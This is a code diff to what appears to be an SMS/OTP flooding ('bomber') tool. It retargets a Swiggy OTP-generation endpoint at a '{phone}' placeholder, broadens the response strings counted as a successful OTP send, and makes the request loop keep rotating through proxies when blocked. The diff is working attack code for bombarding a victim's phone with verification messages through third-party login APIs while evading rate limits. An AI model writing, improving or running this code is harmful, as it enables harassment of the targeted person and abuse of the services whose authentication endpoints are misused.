@@ -261,10 +261,10 @@ APIS = [
     {
         "name": "Swiggy",
         "kind": "sms",
-        "url": "https://api-order.swiggy.com/auth/v2/otp",
+        "url": "https://www.swiggy.com/dapi/auth/otp-generate",
         "method": "POST",
-        "json": {"mobile": "{phone}", "country_code": "91"},
-        "register_json": {"mobile": "{phone}", "country_code": "91", "is_new_user": True},
+        "json": {"mobile": "{phone}"},
+        "register_json": {"mobile": "{phone}"},
         "base_headers": {"Content-Type": "application/json", "Origin": "https://www.swiggy.com", "Referer": "https://www.swiggy.com/"},
     },
     {
@@ -515,12 +515,22 @@ _OK_PATTERNS = (
     '"whatsappSent":true', '"callSent":true',
     "otp sent", "otp has been sent", "successfully sent",
     '"message":"otp', '"message":"success"',
+    '"message": "otp', '"message": "success"',
     '"nonce":', '"tid":', '"token":', '"requestId":',
     '"contactExist":', '"emailExists":',
     '"statuscode":0', '"statusCode":0', '"code":0',
+    '"statusCode":200', '"statusCode": 200',
+    '"status":1', '"status": 1',
+    '"status":200', '"status": 200',
+    '"response_code":"success"', '"response_code": "success"',
+    '"response":"otp', '"response": "otp',
+    '"httpCode":200', '"httpCode": 200',
     '"data":{', '"otpId":',
-    "request processed",
+    '"otp":', '"txnId":',
+    "request processed", "otp generated",
     '"otp_reference":', '"reference_id":',
+    '"is_new_user":', '"user_exists":',
+    '"mobile_verified":', '"phone_verified":',
 )
 
 
@@ -607,11 +617,14 @@ async def _fire_single(session_factory, url, method, headers, payload, name):
             ok = _body_ok(snippet, status)
             if ok:
                 return ok, status, snippet
-            # 403/0 from this proxy — mark bad and try next
+            # 403/407/0 from proxy — mark bad and try next
             if proxy and (status in (403, 407) or status == 0):
-                raw_proxy = proxy.replace("http://", "")
-                _proxy_pool.mark_bad(raw_proxy)
+                _proxy_pool.mark_bad(proxy.replace("http://", ""))
                 continue
+            # Any other proxy failure — don't give up, try next proxy / direct
+            if proxy:
+                continue
+            # Direct request (no proxy) — return whatever we got
             return ok, status, snippet
         except asyncio.TimeoutError:
             if proxy:
